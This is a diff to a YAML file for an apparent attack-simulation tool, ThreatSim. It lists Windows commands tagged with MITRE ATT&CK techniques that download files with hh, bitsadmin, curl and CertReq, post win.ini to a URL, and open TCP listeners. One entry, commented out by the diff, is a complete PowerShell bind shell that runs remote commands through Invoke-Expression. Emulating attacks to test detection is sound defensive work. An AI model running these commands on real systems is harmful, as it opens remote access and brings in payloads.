@@ -4,7 +4,7 @@ commands:
    ingress_tools_hh:
       remote: false
       id: ingress_tools_hh
-      command: 'hh https://github.com/joeavanzato/ThreatSim/TODO.ps1'
+      command: 'hh $RANDOMURL_PS1$'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -13,7 +13,7 @@ commands:
    ingress_tools_bitsadmin_1:
       remote: false
       id: ingress_tools_bitsadmin_1
-      command: 'bitsadmin /create 1 bitsadmin /addfile 1 https://github.com/joeavanzato/ThreatSim/TODO.exe c:\threatsim\threatsim.exe bitsadmin /RESUME 1 bitsadmin /complete 1'
+      command: 'bitsadmin /create 1 | bitsadmin /addfile 1 https://github.com/joeavanzato/ThreatSim/TODO.exe "$TEMPFILE$" | bitsadmin /RESUME 1 | bitsadmin /complete 1'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -22,7 +22,7 @@ commands:
    ingress_tools_certreq:
       remote: false
       id: ingress_tools_certreq
-      command: 'CertReq -Post -config $RANDOMURL$ c:\windows\win.ini C:\threatsim\threatsim.txt'
+      command: 'CertReq -Post -config $RANDOMURL$ c:\windows\win.ini "$TEMPFILE$"'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -40,7 +40,7 @@ commands:
    ingress_tools_curl:
       remote: false
       id: ingress_tools_curl
-      command: 'curl $RANDOMURL$ -o C:\threatsim\threatsim.txt'
+      command: 'curl $RANDOMURL$ -o "$TEMPFILE$"'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -55,13 +55,31 @@ commands:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
          - 'Execution;T1047;Windows Management Instrumentation'
          - 'Command and Control;T1105;Ingress Tool Transfer'
-      comments: 'Download results of curl to output file'
-   network_listen_powershell_uncommmonport_1:
+      comments:
+   #network_listen_powershell_uncommmonport_1:
+   #   remote: false
+   #   id: network_listen_powershell_uncommmonport_1
+   #   command: 'powershell.exe -nop -ep bypass -Command "$VAR1=PORT;$VAR2=[System.Net.Sockets.TcpListener]$VAR1;$VAR2.Start();$VAR3=$VAR2.AcceptTCPClient();$VAR4=$VAR3.GetStream();[byte[]]$VAR5=$RANDOMPORTUNCOMMON$;$VAR6=([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \"+$env:username+\" on \"+$env:computername+\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\");$VAR4.Write($VAR6,0,$VAR6.Length);$VAR6=([text.encoding]::ASCII).GetBytes(\"PS \"+(Get-Location).Path+\"> \");$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -command $VAR8 2>&1 | Out-String )}catch{Write-Warning \"Something went wrong with execution of command on the target.\";Write-Error $_;};$VAR10=$VAR9+ \"PS \"+(Get-Location).Path + \"> \";$VAR11=($error[0] | Out-String);$error.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR2){$VAR2.Stop();};'
+   #   stealth: low
+   #   mitre:
+   #      - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
+   #      - 'Command and Control;T1571;Non-Standard Port'
+   #   comments:
+   network_listen_powershell_uncommonport_2:
       remote: false
-      id: network_listen_powershell_uncommmonport_1
-      command: 'powershell.exe -nop -ep bypass -Command "$VAR1=PORT;$VAR2=[System.Net.Sockets.TcpListener]$VAR1;$VAR2.Start();$VAR3=$VAR2.AcceptTCPClient();$VAR4=$VAR3.GetStream();[byte[]]$VAR5=$RANDOMPORTUNCOMMON$;$VAR6=([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \"+$env:username+\" on \"+$env:computername+\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\");$VAR4.Write($VAR6,0,$VAR6.Length);$VAR6=([text.encoding]::ASCII).GetBytes(\"PS \"+(Get-Location).Path+\"> \");$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -command $VAR8 2>&1 | Out-String )}catch{Write-Warning \"Something went wrong with execution of command on the target.\";Write-Error $_;};$VAR10=$VAR9+ \"PS \"+(Get-Location).Path + \"> \";$VAR11=($error[0] | Out-String);$error.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR2){$VAR2.Stop();};'
+      id: network_listen_powershell_uncommonport_2
+      command: powershell -Command ""Start-Process powershell.exe -ArgumentList '-NoExit -command $listener = [System.Net.Sockets.TcpListener]$RANDOMPORTUNCOMMON$; $Listener.Start()'""
       stealth: low
       mitre:
          - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
          - 'Command and Control;T1571;Non-Standard Port'
-      comments: 'Download results of curl to output file'
+      comments:
+   network_listen_powershell_uncommonport_3:
+      remote: false
+      id: network_listen_powershell_uncommonport_3
+      command: powershell -Command ""Start-Process powershell.exe -ArgumentList '-NoExit -command $listener = [System.Net.Sockets.TcpListener]$RANDOMPORTCOMMON$; $Listener.Start()'""
+      stealth: low
+      mitre:
+         - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
+         - 'Command and Control;T0885;Commonly Used Port'
+      comments:
